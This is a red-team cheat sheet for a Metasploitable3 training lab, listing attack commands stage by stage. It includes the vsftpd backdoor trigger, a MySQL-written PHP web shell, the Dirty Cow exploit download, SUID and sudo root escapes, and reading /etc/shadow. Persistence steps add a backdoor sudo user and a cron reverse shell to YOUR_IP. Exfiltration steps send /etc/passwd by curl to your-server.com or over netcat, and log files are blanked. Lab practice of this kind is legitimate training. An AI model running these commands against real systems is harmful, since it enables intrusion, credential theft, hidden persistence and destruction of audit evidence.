# Metasploitable3 Challenge Cheat Sheet
## Quick Reference for Red Team Exercises

## 🚀 QUICK START COMMANDS

```bash
# Start lab
bash one-line-setup.sh

# Access Kali
docker exec -it kali_attacker bash

# Basic tools install
apt update && apt install -y \
  nmap gobuster nikto hydra \
  sqlmap smbclient enum4linux \
  mysql-client netcat
```

---

## 🔍 RECONNAISSANCE

### Network Scanning
```bash
# Quick discovery
nmap -sn 172.23.0.0/24

# Full port scan
nmap -p- -T4 victim

# Service detection
nmap -sV -sC -O victim -oA full-scan

# UDP scan (slower)
nmap -sU -T4 --top-ports 100 victim
```

### Web Enumeration
```bash
# Directory brute force
gobuster dir -u http://victim -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb http://victim

# Vulnerability scan
nikto -h http://victim -o nikto-scan.txt

# Subdomain enumeration (if applicable)
gobuster dns -d victim -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
```

### SMB Enumeration
```bash
# List shares
smbclient -L //victim -N

# Connect to share
smbclient //victim/sharename -N

# Full enumeration
enum4linux -a victim > smb-enum.txt

# Check for null session
rpcclient -U "" victim -N
```

---

## ⚔️ EXPLOITATION

### FTP (Port 21)
```bash
# Anonymous access
ftp victim
# User: anonymous
# Pass: [any email]

# vsftpd 2.3.4 backdoor
telnet victim 21
USER hello:)
PASS world
# Then connect to port 6200

# Brute force
hydra -L users.txt -P passwords.txt ftp://victim
```

### SSH (Port 22)
```bash
# Default credentials
ssh msfadmin@victim
# Password: msfadmin

# Brute force
hydra -l username -P rockyou.txt ssh://victim

# Key-based attack (if authorized_keys writable)
echo "ssh-rsa [your_key]" >> ~/.ssh/authorized_keys
```

### MySQL (Port 3306)
```bash
# Default login
mysql -h victim -u root

# Enumerate
SHOW DATABASES;
USE dvwa;
SHOW TABLES;
SELECT * FROM users;

# Write web shell (if file priv)
SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';
```

### SMB (Ports 139/445)
```bash
# Anonymous access
smbclient //victim/tmp -N

# Brute force
hydra -L users.txt -P passwords.txt smb://victim

# Pass-the-hash (if you have hashes)
pth-winexe -U administrator%hash //victim cmd.exe
```

### Web Applications
```bash
# DVWA login
# URL: http://victim/dvwa
# User: admin
# Pass: password

# Mutillidae login
# URL: http://victim/mutillidae
# User: admin
# Pass: password

# SQL injection test
sqlmap -u "http://victim/dvwa/vulnerabilities/sqli/?id=1" --cookie="security=low;PHPSESSID=xxx" --batch

# Command injection
curl "http://victim/dvwa/vulnerabilities/exec/?ip=127.0.0.1;id"
```

---

## ⬆️ PRIVILEGE ESCALATION

### System Enumeration
```bash
# Basic info
uname -a
cat /etc/os-release
id
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable files
find / -writable 2>/dev/null | grep -v /proc

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

### Common Exploits

#### Dirty Cow (CVE-2016-5195)
```bash
# Check kernel
uname -a
# If 2.6.22 < kernel < 4.8.3

# Download and compile
wget https://www.exploit-db.com/download/40839 -O dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
# Password: dirty
su root
```

#### SUID Exploits
```bash
# If find has SUID
find . -exec /bin/sh \; -quit

# If nmap has SUID
nmap --interactive
nmap> !sh

# If vim has SUID
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

#### Sudo Misconfigurations
```bash
# Check sudo rights
sudo -l

# Common exploitable commands:
sudo find / -exec /bin/bash \;
sudo perl -e 'exec "/bin/bash"'
sudo python -c 'import os; os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
```

---

## 📁 POST-EXPLOITATION

### Information Gathering
```bash
# Users and groups
cat /etc/passwd
cat /etc/group
cat /etc/shadow

# Network info
ifconfig
netstat -tulpn
arp -a
route -n

# Processes
ps aux
top

# Installed software
dpkg -l
rpm -qa
```

### Credential Harvesting
```bash
# Find password files
find / -name "*pass*" -type f 2>/dev/null
find / -name "*cred*" -type f 2>/dev/null

# Check config files
find / -name "*.conf" -type f -exec grep -l "password\|passwd\|secret" {} \; 2>/dev/null

# Browser credentials (if any)
find /home -name "*.sqlite" -type f 2>/dev/null
```

### Persistence
```bash
# Add user
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor

# Cron job
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -

# SSH key
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

### Data Exfiltration
```bash
# Find interesting files
find / -type f \( -name "*.txt" -o -name "*.doc" -o -name "*.pdf" -o -name "*.xls" \) 2>/dev/null

# Compress data
tar -czf /tmp/data.tar.gz /etc/passwd /etc/shadow /var/www/

# Exfiltrate
# Method 1: HTTP
python -m SimpleHTTPServer 8000

# Method 2: Netcat
nc -lvnp 4444 < /tmp/data.tar.gz
# On attacker: nc victim_ip 4444 > data.tar.gz

# Method 3: Base64 encode
cat /etc/passwd | base64 | curl -X POST -d @- http://your-server.com/log
```

---

## 🧹 CLEANUP

### Remove Artifacts
```bash
# Delete uploaded files
rm -f /var/www/shell.php
rm -f /tmp/exploit

# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Remove users
userdel backdoor
rm -rf /home/backdoor

# Remove cron jobs
crontab -r
```

### Remove Persistence
```bash
# Remove SSH keys
rm -f /root/.ssh/authorized_keys

# Remove backdoor scripts
rm -f /etc/init.d/backdoor
update-rc.d backdoor remove

# Check for other backdoors
find / -name "*backdoor*" -type f 2>/dev/null
find / -name "*shell*" -type f 2>/dev/null
```

---

## 📊 REPORTING QUICK TEMPLATE

```markdown
# Finding: [Vulnerability Name]
**CVSS:** [Score] [Severity]
**Target:** victim (172.23.0.3)
**Port:** [Port Number]

## Description
[Brief description]

## Impact
[What can an attacker do]

## Proof of Concept
```
[Command output or screenshot]
```

## Remediation
1. [Step 1]
2. [Step 2]
3. [Step 3]
```

---

## 🎯 COMMON DEFAULT CREDENTIALS

### Metasploitable3 Defaults:
- **SSH:** msfadmin/msfadmin
- **MySQL:** root/(empty)
- **PostgreSQL:** postgres/postgres
- **DVWA:** admin/password
- **Mutillidae:** admin/password
- **phpMyAdmin:** root/(empty)

### Common Services:
- **FTP:** anonymous/[any email]
- **Tomcat:** tomcat/tomcat
- **Jenkins:** admin/admin
- **WordPress:** admin/admin
- **Joomla:** admin/admin

---

## ⏱️ TIME-BASED CHALLENGES

### Beginner (30 minutes):
- Find all open ports
- Identify 3 services
- Gain initial access via FTP

### Intermediate (1 hour):
- Compromise SSH
- Access MySQL
- Extract data from one table

### Advanced (2 hours):
- Gain root access
- Establish persistence
- Exfiltrate /etc/shadow

### Expert (4 hours):
- Complete penetration test
- Write professional report
- Suggest remediation steps

---

## 🔧 TROUBLESHOOTING

### Common Issues:

1. **Can't connect to services:**
   ```bash
   # Check if containers are running
   docker compose ps
   
   # Check if services are up inside victim
   docker exec victim netstat -tulpn
   
   # Restart if needed
   docker compose restart victim
   ```

2. **Tools missing in Kali:**
   ```bash
   apt update
   apt install [tool-name]
   ```

3. **Exploit not working:**
   - Check service version
   - Try alternative exploit
   - Manual testing before automation

4. **Permission denied:**
   ```bash
   # Check current user
   whoami
   
   # Check sudo rights
   sudo -l
   
   # Find SUID binaries
   find / -perm -4000 2>/dev/null
   ```

---

## 📚 LEARNING RESOURCES

### Quick References:
- **GTFOBins:** https://gtfobins.github.io/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks:** https://book.hacktricks.xyz/
- **Exploit-DB:** https://www.exploit-db.com/

### Practice Platforms:
- **TryHackMe:** https://tryhackme.com/
- **Hack The Box:** https://www.hackthebox.com/
- **VulnHub:** https://www.vulnhub.com/
- **PentesterLab:** https://pentesterlab.com/

---

*Keep this cheat sheet handy during exercises!* 🎯